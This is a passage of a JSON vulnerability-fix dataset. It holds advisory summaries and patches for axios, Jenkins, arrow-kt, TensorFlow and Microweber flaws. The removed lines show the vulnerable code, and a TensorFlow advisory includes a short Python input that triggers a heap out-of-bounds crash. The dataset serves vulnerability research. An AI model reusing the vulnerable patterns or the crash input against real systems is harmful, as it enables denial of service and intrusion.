            "patch_content":"From 5b457116e31db0e88fede6c428e969e87f290929 Mon Sep 17 00:00:00 2001\nFrom: ready-research <72916209+ready-research@users.noreply.github.com>\nDate: Mon, 30 Aug 2021 18:03:43 +0530\nSubject: [PATCH] Security fix for ReDoS (#3980)\n\n---\n lib\/utils.js | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\ndiff --git a\/lib\/utils.js b\/lib\/utils.js\nindex 28ccfff3c0..5d966f4448 100644\n--- a\/lib\/utils.js\n+++ b\/lib\/utils.js\n@@ -185,7 +185,7 @@ function isURLSearchParams(val) {\n  * @returns {String} The String freed of excess whitespace\n  *\/\n function trim(str) {\n-  return str.replace(\/^\\s*\/, '').replace(\/\\s*$\/, '');\n+  return str.trim ? str.trim() : str.replace(\/^\\s+|\\s+$\/g, '');\n }\n \n \/**",
            "code_diff":"@@ -185,7 +185,7 @@ function isURLSearchParams(val) {\n  * @returns {String} The String freed of excess whitespace\n  *\/\n function trim(str) {\n-  return str.replace(\/^\\s*\/, '').replace(\/\\s*$\/, '');\n+  return str.trim ? str.trim() : str.replace(\/^\\s+|\\s+$\/g, '');\n }\n \n \/**"
        },
        {
            "index":481,
            "vuln_id":"GHSA-4h47-h3cr-23wh",
            "cwe_id":"{'CWE-285'}",
            "score":6.5,
            "chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/01157a699f611ca7492e872103ac01526a982cf2'}",
            "dataset":"osv",
            "summary":"Improper Authorization in Jenkins A denial of service vulnerability exists in Jenkins 2.145 and earlier, LTS 2.138.1 and earlier in core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java that allows attackers without Overall\/Read permission to access a specific URL on instances using the built-in Jenkins user database security realm that results in the creation of an ephemeral user record in memory.",
            "published_date":"2022-05-13",
            "chain_len":1,
            "project":"https:\/\/github.com\/jenkinsci\/jenkins",
            "commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/01157a699f611ca7492e872103ac01526a982cf2",
            "commit_sha":"01157a699f611ca7492e872103ac01526a982cf2",
            "patch":"SINGLE",
            "chain_ord":"['01157a699f611ca7492e872103ac01526a982cf2']",
            "before_first_fix_commit":"{'df87e12ddcfeafdba6e0de0e07b3e21f8473ece6'}",
            "last_fix_commit":"01157a699f611ca7492e872103ac01526a982cf2",
            "chain_ord_pos":1.0,
            "commit_datetime":"09\/27\/2018, 09:18:42",
            "message":"[SECURITY-1128]",
            "author":"Daniel Beck",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 1, 'total': 3}",
            "files":"{'core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/01157a699f611ca7492e872103ac01526a982cf2\/core%2Fsrc%2Fmain%2Fjava%2Fhudson%2Fsecurity%2FHudsonPrivateSecurityRealm.java', 'patch': '@@ -475,8 +475,9 @@ public List<User> getAllUsers() {\\n      * This is to map users under the security realm URL.\\n      * This in turn helps us set up the right navigation breadcrumb.\\n      *\/\\n+    @Restricted(NoExternalUse.class)\\n     public User getUser(String id) {\\n-        return User.getById(id, true);\\n+        return User.getById(id, User.ALLOW_USER_CREATION_VIA_URL && hasPermission(Jenkins.ADMINISTER));\\n     }\\n \\n     \/\/ TODO'}}",
            "message_norm":"[security-1128]",
            "language":"en",
            "entities":"[('security-1128', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java'])",
            "num_files":1.0,
            "patch_content":"From 01157a699f611ca7492e872103ac01526a982cf2 Mon Sep 17 00:00:00 2001\nFrom: Daniel Beck <daniel-beck@users.noreply.github.com>\nDate: Thu, 27 Sep 2018 11:18:42 +0200\nSubject: [PATCH] [SECURITY-1128]\n\n---\n ...\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java  | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\ndiff --git a\/core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java b\/core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java\nindex 01b3233108ca..e877ee6291a2 100644\n--- a\/core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java\n+++ b\/core\/src\/main\/java\/hudson\/security\/HudsonPrivateSecurityRealm.java\n@@ -475,8 +475,9 @@ public List<User> getAllUsers() {\n      * This is to map users under the security realm URL.\n      * This in turn helps us set up the right navigation breadcrumb.\n      *\/\n+    @Restricted(NoExternalUse.class)\n     public User getUser(String id) {\n-        return User.getById(id, true);\n+        return User.getById(id, User.ALLOW_USER_CREATION_VIA_URL && hasPermission(Jenkins.ADMINISTER));\n     }\n \n     \/\/ TODO",
            "code_diff":"@@ -475,8 +475,9 @@ public List<User> getAllUsers() {\n      * This is to map users under the security realm URL.\n      * This in turn helps us set up the right navigation breadcrumb.\n      *\/\n+    @Restricted(NoExternalUse.class)\n     public User getUser(String id) {\n-        return User.getById(id, true);\n+        return User.getById(id, User.ALLOW_USER_CREATION_VIA_URL && hasPermission(Jenkins.ADMINISTER));\n     }\n \n     \/\/ TODO"
        },
        {
            "index":44,
            "vuln_id":"GHSA-rcj2-vvjx-87pm",
            "cwe_id":"{'CWE-311'}",
            "score":5.9,
            "chain":"{'https:\/\/github.com\/arrow-kt\/arrow\/commit\/74198dab522393487d5344f194dc21208ab71ae8'}",
            "dataset":"osv",
            "summary":"Missing Encryption of Sensitive Data in arrow-kt Arrow arrow-kt Arrow before 0.9.0 resolved Gradle build artifacts (for compiling and building the published JARs) over HTTP instead of HTTPS. Any of these dependent artifacts could have been maliciously compromised by an MITM attack.",
            "published_date":"2019-04-22",
            "chain_len":1,
            "project":"https:\/\/github.com\/arrow-kt\/arrow",
            "commit_href":"https:\/\/github.com\/arrow-kt\/arrow\/commit\/74198dab522393487d5344f194dc21208ab71ae8",
            "commit_sha":"74198dab522393487d5344f194dc21208ab71ae8",
            "patch":"SINGLE",
            "chain_ord":"['74198dab522393487d5344f194dc21208ab71ae8']",
            "before_first_fix_commit":"{'b78924304193c4301b1c0a6cc0c253f105ed0a15'}",
            "last_fix_commit":"74198dab522393487d5344f194dc21208ab71ae8",
            "chain_ord_pos":1.0,
            "commit_datetime":"02\/19\/2019, 17:11:32",
            "message":"Fix some http vulnerabilities",
            "author":"Paco",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 4, 'total': 8}",
            "files":"{'build.gradle': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/arrow-kt\/arrow\/raw\/74198dab522393487d5344f194dc21208ab71ae8\/build.gradle', 'patch': '@@ -39,7 +39,7 @@ buildscript {\\n             url \"https:\/\/plugins.gradle.org\/m2\/\"\\n         }\\n         jcenter()\\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\\n         maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\/\" }\\n     }\\n@@ -69,8 +69,8 @@ allprojects {\\n     repositories {\\n         jcenter()\\n         maven { url \\'https:\/\/kotlin.bintray.com\/kotlinx\\' }\\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n-        maven { url \"http:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\\n+        maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\\n     }\\n }\\n@@ -252,4 +252,4 @@ dependencyUpdates {\\n \\n task checkDependenciesVersion {\\n     dependsOn dependencyUpdates\\n-}\\n\\\\ No newline at end of file\\n+}'}}",
            "message_norm":"fix some http vulnerabilities",
            "language":"sv",
            "entities":"[('fix', 'ACTION', ''), ('vulnerabilities', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['build.gradle'])",
            "num_files":1.0,
            "patch_content":"From 74198dab522393487d5344f194dc21208ab71ae8 Mon Sep 17 00:00:00 2001\nFrom: Paco <pakoito@users.noreply.github.com>\nDate: Tue, 19 Feb 2019 09:11:32 -0800\nSubject: [PATCH] Fix some http vulnerabilities\n\n---\n build.gradle | 8 ++++----\n 1 file changed, 4 insertions(+), 4 deletions(-)\n\ndiff --git a\/build.gradle b\/build.gradle\nindex 5da8d01fdf3..08e84d1cffd 100644\n--- a\/build.gradle\n+++ b\/build.gradle\n@@ -39,7 +39,7 @@ buildscript {\n             url \"https:\/\/plugins.gradle.org\/m2\/\"\n         }\n         jcenter()\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\n         maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\/\" }\n     }\n@@ -69,8 +69,8 @@ allprojects {\n     repositories {\n         jcenter()\n         maven { url 'https:\/\/kotlin.bintray.com\/kotlinx' }\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n-        maven { url \"http:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n+        maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\n     }\n }\n@@ -252,4 +252,4 @@ dependencyUpdates {\n \n task checkDependenciesVersion {\n     dependsOn dependencyUpdates\n-}\n\\ No newline at end of file\n+}",
            "code_diff":"@@ -39,7 +39,7 @@ buildscript {\n             url \"https:\/\/plugins.gradle.org\/m2\/\"\n         }\n         jcenter()\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\n         maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\/\" }\n     }\n@@ -69,8 +69,8 @@ allprojects {\n     repositories {\n         jcenter()\n         maven { url 'https:\/\/kotlin.bintray.com\/kotlinx' }\n-        maven { url \"http:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n-        maven { url \"http:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\n+        maven { url \"https:\/\/dl.bintray.com\/kotlin\/kotlin-dev\" }\n+        maven { url \"https:\/\/dl.bintray.com\/arrow-kt\/arrow-kt\" }\n         maven { url \"https:\/\/dl.bintray.com\/jetbrains\/markdown\/\" }\n     }\n }\n@@ -252,4 +252,4 @@ dependencyUpdates {\n \n task checkDependenciesVersion {\n     dependsOn dependencyUpdates\n-}\n\\ No newline at end of file\n+}"
        },
        {
            "index":30,
            "vuln_id":"GHSA-gjqc-q9g6-q2j3",
            "cwe_id":"{'CWE-617'}",
            "score":6.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9'}",
            "dataset":"osv",
            "summary":"`CHECK`-failures in binary ops in Tensorflow ### Impact\nA malicious user can cause a denial of service by altering a `SavedModel` such that [any binary op](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/kernels\/cwise_ops_common.h#L88-L137) would trigger `CHECK` failures. This occurs when the protobuf part corresponding to the tensor arguments is modified such that the `dtype` no longer matches the `dtype` expected by the op. In that case, calling the templated binary operator for the binary op would receive corrupted data, due to the type confusion involved:\n\n```cc\nfunctor::BinaryFunctor<Device, Functor, 1>()(\n    eigen_device, out->template flat<Tout>(),\n    input_0.template flat<Tin>(), input_1.template flat<Tin>(),\n    error_ptr);\n```\nIf `Tin` and `Tout` don't match the type of data in `out` and `input_*` tensors then `flat<*>` would interpret it wrongly. In most cases, this would be a silent failure, but we have noticed scenarios where this results in a `CHECK` crash, hence a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9).\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
            "published_date":"2022-02-10",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9",
            "commit_sha":"a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9",
            "patch":"SINGLE",
            "chain_ord":"['a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9']",
            "before_first_fix_commit":"{'c7db81b86b6746b494e5359433aa8e2dd7df25f6'}",
            "last_fix_commit":"a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9",
            "chain_ord_pos":1.0,
            "commit_datetime":"11\/12\/2021, 08:24:39",
            "message":"Validate real and expected type of arguments to cwise ops.\n\nWithout this validation, it is possible to trigger a `CHECK`-fail denial of service.\n\nThis is a rollforward of a previous commit which was rolled back as it was relying on RTTI. This time we don't use RTTI, we replace `typeid(Tin).name()` with a double function call, `DataTypeString(DataTypeToEnum<Tin>::v())`.\n\nPiperOrigin-RevId: 409340416\nChange-Id: I96080b2796729a3a9b65e7c68307ac276070f2f0",
            "author":"Mihai Maruseac",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 0, 'total': 10}",
            "files":"{'tensorflow\/core\/kernels\/cwise_ops_common.h': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9\/tensorflow%2Fcore%2Fkernels%2Fcwise_ops_common.h', 'patch': '@@ -87,7 +87,17 @@ class BinaryOp : public BinaryOpShared {\\n \\n   void Compute(OpKernelContext* ctx) override {\\n     const Tensor& input_0 = ctx->input(0);\\n+    OP_REQUIRES(ctx, input_0.dtype() == DataTypeToEnum<Tin>::v(),\\n+                errors::InvalidArgument(\\n+                    \"Expected tensor of type \",\\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\\n+                    DataTypeString(input_0.dtype())));\\n     const Tensor& input_1 = ctx->input(1);\\n+    OP_REQUIRES(ctx, input_1.dtype() == DataTypeToEnum<Tin>::v(),\\n+                errors::InvalidArgument(\\n+                    \"Expected tensor of type \",\\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\\n+                    DataTypeString(input_1.dtype())));\\n     const Device& eigen_device = ctx->eigen_device<Device>();\\n     bool error = false;\\n     bool* const error_ptr = Functor::has_errors ? &error : nullptr;'}}",
            "message_norm":"validate real and expected type of arguments to cwise ops.\n\nwithout this validation, it is possible to trigger a `check`-fail denial of service.\n\nthis is a rollforward of a previous commit which was rolled back as it was relying on rtti. this time we don't use rtti, we replace `typeid(tin).name()` with a double function call, `datatypestring(datatypetoenum<tin>::v())`.\n\npiperorigin-revid: 409340416\nchange-id: i96080b2796729a3a9b65e7c68307ac276070f2f0",
            "language":"en",
            "entities":"[('validate', 'ACTION', ''), ('denial of service', 'SECWORD', ''), ('409340416', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/cwise_ops_common.h'])",
            "num_files":1.0,
            "patch_content":"From a7c02f1a9bbc35473969618a09ee5f9f5d3e52d9 Mon Sep 17 00:00:00 2001\nFrom: Mihai Maruseac <mihaimaruseac@google.com>\nDate: Fri, 12 Nov 2021 00:24:39 -0800\nSubject: [PATCH] Validate real and expected type of arguments to cwise ops.\n\nWithout this validation, it is possible to trigger a `CHECK`-fail denial of service.\n\nThis is a rollforward of a previous commit which was rolled back as it was relying on RTTI. This time we don't use RTTI, we replace `typeid(Tin).name()` with a double function call, `DataTypeString(DataTypeToEnum<Tin>::v())`.\n\nPiperOrigin-RevId: 409340416\nChange-Id: I96080b2796729a3a9b65e7c68307ac276070f2f0\n---\n tensorflow\/core\/kernels\/cwise_ops_common.h | 10 ++++++++++\n 1 file changed, 10 insertions(+)\n\ndiff --git a\/tensorflow\/core\/kernels\/cwise_ops_common.h b\/tensorflow\/core\/kernels\/cwise_ops_common.h\nindex ed4125f45579f3..fa48717ab1c285 100644\n--- a\/tensorflow\/core\/kernels\/cwise_ops_common.h\n+++ b\/tensorflow\/core\/kernels\/cwise_ops_common.h\n@@ -87,7 +87,17 @@ class BinaryOp : public BinaryOpShared {\n \n   void Compute(OpKernelContext* ctx) override {\n     const Tensor& input_0 = ctx->input(0);\n+    OP_REQUIRES(ctx, input_0.dtype() == DataTypeToEnum<Tin>::v(),\n+                errors::InvalidArgument(\n+                    \"Expected tensor of type \",\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\n+                    DataTypeString(input_0.dtype())));\n     const Tensor& input_1 = ctx->input(1);\n+    OP_REQUIRES(ctx, input_1.dtype() == DataTypeToEnum<Tin>::v(),\n+                errors::InvalidArgument(\n+                    \"Expected tensor of type \",\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\n+                    DataTypeString(input_1.dtype())));\n     const Device& eigen_device = ctx->eigen_device<Device>();\n     bool error = false;\n     bool* const error_ptr = Functor::has_errors ? &error : nullptr;",
            "code_diff":"@@ -87,7 +87,17 @@ class BinaryOp : public BinaryOpShared {\n \n   void Compute(OpKernelContext* ctx) override {\n     const Tensor& input_0 = ctx->input(0);\n+    OP_REQUIRES(ctx, input_0.dtype() == DataTypeToEnum<Tin>::v(),\n+                errors::InvalidArgument(\n+                    \"Expected tensor of type \",\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\n+                    DataTypeString(input_0.dtype())));\n     const Tensor& input_1 = ctx->input(1);\n+    OP_REQUIRES(ctx, input_1.dtype() == DataTypeToEnum<Tin>::v(),\n+                errors::InvalidArgument(\n+                    \"Expected tensor of type \",\n+                    DataTypeString(DataTypeToEnum<Tin>::v()), \" but got type \",\n+                    DataTypeString(input_1.dtype())));\n     const Device& eigen_device = ctx->eigen_device<Device>();\n     bool error = false;\n     bool* const error_ptr = Functor::has_errors ? &error : nullptr;"
        },
        {
            "index":642,
            "vuln_id":"GHSA-73rp-q4rx-5grc",
            "cwe_id":"{'CWE-284', 'CWE-863'}",
            "score":8.8,
            "chain":"{'https:\/\/github.com\/microweber\/microweber\/commit\/c162dfffb9bfd264d232aaaf5bb3daee16a3cb38'}",
            "dataset":"osv",
            "summary":"Incorrect Authorization in microweber Users Account Pre-Takeover or Users Account Takeover. in GitHub repository microweber\/microweber prior to 1.2.15. Victim Account Take Over. Since, there is no email confirmation, an attacker can easily create an account in the application using the Victim\u2019s Email. This allows an attacker to gain pre-authentication to the victim\u2019s account. Further, due to the lack of proper validation of email coming from Social Login and failing to check if an account already exists, the victim will not identify if an account is already existing. Hence, the attacker\u2019s persistence will remain. An attacker would be able to see all the activities performed by the victim user impacting the confidentiality and attempt to modify\/corrupt the data impacting the integrity and availability factor. This attack becomes more interesting when an attacker can register an account from an employee\u2019s email address. Assuming the organization uses G-Suite, it is much more impactful to hijack into an employee\u2019s account.",
            "published_date":"2022-05-10",
            "chain_len":1,
            "project":"https:\/\/github.com\/microweber\/microweber",
            "commit_href":"https:\/\/github.com\/microweber\/microweber\/commit\/c162dfffb9bfd264d232aaaf5bb3daee16a3cb38",
            "commit_sha":"c162dfffb9bfd264d232aaaf5bb3daee16a3cb38",
            "patch":"SINGLE",
            "chain_ord":"['c162dfffb9bfd264d232aaaf5bb3daee16a3cb38']",
            "before_first_fix_commit":"{'12c0316b3bde8ff6a6adc5d2a05f6409b03c9556'}",
            "last_fix_commit":"c162dfffb9bfd264d232aaaf5bb3daee16a3cb38",
            "chain_ord_pos":1.0,
            "commit_datetime":"05\/09\/2022, 12:54:29",
            "message":"Update index.blade.php",
            "author":"Bozhidar Slaveykov",
            "comments":null,
            "stats":"{'additions': 4, 'deletions': 2, 'total': 6}",
            "files":"{'src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/microweber\/microweber\/raw\/c162dfffb9bfd264d232aaaf5bb3daee16a3cb38\/src%2FMicroweberPackages%2FShop%2Fresources%2Fviews%2Findex.blade.php', 'patch': '@@ -46,9 +46,11 @@\\n                         <div class=\"d-flex\">\\n                             <p class=\"col-6 mb-0\">\\n                                 @if($product->hasSpecialPrice())\\n-                                    <span class=\"price-old\"><?php print currency_format($product->specialPrice); ?><\/span>\\n+                                    <span class=\"price-old\"><?php print currency_format($product->price); ?><\/span>\\n+                                    <span class=\"money\"><?php print currency_format($product->specialPrice); ?><\/span>\\n+                                @else\\n+                                    <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\\n                                 @endif\\n-                                <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\\n                             <\/p>\\n \\n                             <a class=\"col-6 text-end text-right align-self-center\" href=\"{{content_link($product->id)}}\"> View<\/a>'}}",
            "message_norm":"update index.blade.php",
            "language":"sv",
            "entities":"[('update', 'ACTION', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php'])",
            "num_files":1.0,
            "patch_content":"From c162dfffb9bfd264d232aaaf5bb3daee16a3cb38 Mon Sep 17 00:00:00 2001\nFrom: Bozhidar Slaveykov <bobi@microweber.com>\nDate: Mon, 9 May 2022 15:54:29 +0300\nSubject: [PATCH] Update index.blade.php\n\n---\n src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php | 6 ++++--\n 1 file changed, 4 insertions(+), 2 deletions(-)\n\ndiff --git a\/src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php b\/src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php\nindex bfdeb89dacd..d7a0036ecdc 100644\n--- a\/src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php\n+++ b\/src\/MicroweberPackages\/Shop\/resources\/views\/index.blade.php\n@@ -46,9 +46,11 @@\n                         <div class=\"d-flex\">\n                             <p class=\"col-6 mb-0\">\n                                 @if($product->hasSpecialPrice())\n-                                    <span class=\"price-old\"><?php print currency_format($product->specialPrice); ?><\/span>\n+                                    <span class=\"price-old\"><?php print currency_format($product->price); ?><\/span>\n+                                    <span class=\"money\"><?php print currency_format($product->specialPrice); ?><\/span>\n+                                @else\n+                                    <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\n                                 @endif\n-                                <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\n                             <\/p>\n \n                             <a class=\"col-6 text-end text-right align-self-center\" href=\"{{content_link($product->id)}}\"> View<\/a>",
            "code_diff":"@@ -46,9 +46,11 @@\n                         <div class=\"d-flex\">\n                             <p class=\"col-6 mb-0\">\n                                 @if($product->hasSpecialPrice())\n-                                    <span class=\"price-old\"><?php print currency_format($product->specialPrice); ?><\/span>\n+                                    <span class=\"price-old\"><?php print currency_format($product->price); ?><\/span>\n+                                    <span class=\"money\"><?php print currency_format($product->specialPrice); ?><\/span>\n+                                @else\n+                                    <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\n                                 @endif\n-                                <span class=\"money\"><?php print currency_format($product->price); ?><\/span>\n                             <\/p>\n \n                             <a class=\"col-6 text-end text-right align-self-center\" href=\"{{content_link($product->id)}}\"> View<\/a>"
        },
        {
            "index":898,
            "vuln_id":"GHSA-4f99-p9c2-3j8x",
            "cwe_id":"{'CWE-125', 'CWE-824'}",
            "score":7.8,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae'}",
            "dataset":"osv",
            "summary":"Undefined behavior via `nullptr` reference binding in sparse matrix multiplication ### Impact\nThe [code for sparse matrix multiplication](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/8d72537c6abf5a44103b57b9c2e22c14f5f49698\/tensorflow\/core\/kernels\/sparse_matmul_op.cc#L954-L1086) is vulnerable to undefined behavior via binding a reference to `nullptr`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SparseMatMul(\n  a=[[1.0,1.0,1.0]],\n  b=[[],[],[]],\n  transpose_a=False,\n  transpose_b=False,\n  a_is_sparse=False, \n  b_is_sparse=True)\n```\n\nThis occurs whenever the dimensions of `a` or `b` are 0 or less. In the case on one of these is 0, an empty output tensor should be allocated (to conserve the invariant that output tensors are always allocated when the operation is successful) but nothing should be written to it (that is, we should return early from the kernel implementation). Otherwise, attempts to write to this empty tensor would result in heap OOB access.\n\n### Patches\nWe have patched the issue in GitHub commit [e6cf28c72ba2eb949ca950d834dd6d66bb01cfae](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2021-11-10",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae",
            "commit_sha":"e6cf28c72ba2eb949ca950d834dd6d66bb01cfae",
            "patch":"SINGLE",
            "chain_ord":"['e6cf28c72ba2eb949ca950d834dd6d66bb01cfae']",
            "before_first_fix_commit":"{'d4fdd7830befb1f3aed8b4d1681471531856ae77'}",
            "last_fix_commit":"e6cf28c72ba2eb949ca950d834dd6d66bb01cfae",
            "chain_ord_pos":1.0,
            "commit_datetime":"10\/06\/2021, 04:54:15",
            "message":"Validate that matrix dimension sizes in SparseMatMul are positive.\n\nPiperOrigin-RevId: 401149683\nChange-Id: Ib33eafc561a39c8741ece80b2edce6d4aae9a57d",
            "author":"Penporn Koanantakool",
            "comments":null,
            "stats":"{'additions': 10, 'deletions': 0, 'total': 10}",
            "files":"{'tensorflow\/core\/kernels\/sparse_matmul_op.cc': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae\/tensorflow%2Fcore%2Fkernels%2Fsparse_matmul_op.cc', 'patch': '@@ -32,6 +32,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/kernels\/fill_functor.h\"\\n #include \"tensorflow\/core\/lib\/core\/blocking_counter.h\"\\n #include \"tensorflow\/core\/lib\/core\/threadpool.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n #include \"tensorflow\/core\/platform\/logging.h\"\\n #include \"tensorflow\/core\/platform\/macros.h\"\\n #include \"tensorflow\/core\/platform\/mutex.h\"\\n@@ -980,9 +981,18 @@ class SparseMatMulOp : public OpKernel {\\n                 errors::InvalidArgument(\\n                     \"Matrix size incompatible: a: \", a.shape().DebugString(),\\n                     \", b: \", b.shape().DebugString()));\\n+    OP_REQUIRES(ctx, m >= 0 && n >= 0 && k >= 0,\\n+                errors::InvalidArgument(\\n+                    \"Matrix dimensions cannot be negative: a: \",\\n+                    a.shape().DebugString(), \", b: \", b.shape().DebugString()));\\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(0, TensorShape({m, n}), &output));\\n \\n+    \/\/ Return early if at least one of the output dimension size is 0.\\n+    if (m == 0 || n == 0) {\\n+      return;\\n+    }\\n+\\n     if (k == 0) {\\n       \/\/ If the inner dimension k in the matrix multiplication is zero, we fill\\n       \/\/ the output with zeros.'}}",
            "message_norm":"validate that matrix dimension sizes in sparsematmul are positive.\n\npiperorigin-revid: 401149683\nchange-id: ib33eafc561a39c8741ece80b2edce6d4aae9a57d",
            "language":"en",
            "entities":"[('validate', 'ACTION', ''), ('401149683', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/core\/kernels\/sparse_matmul_op.cc'])",
            "num_files":1.0,
